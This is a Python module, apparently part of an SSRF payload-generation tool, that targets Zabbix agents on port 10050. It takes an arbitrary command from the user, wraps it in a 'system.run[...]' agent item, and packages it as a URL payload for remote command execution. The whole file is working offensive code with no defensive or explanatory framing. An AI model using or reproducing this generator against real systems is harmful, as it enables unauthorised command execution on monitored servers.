from .base import *

class Zabbix(GENERATOR):
    default_port = 10050
    requirement = ["command"]

    def __init__(self, parser, options=None):
        super().__init__(parser, options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.command == "":
            self.wizard("Give the command to execute:", "command")
        else:
            self.command = arg.command
    
    def generate(self):
        command = self.command
        payload = "system.run[("  + command + ");sleep 2s]"
        self.set_url_payload(payload)
        return super().generate()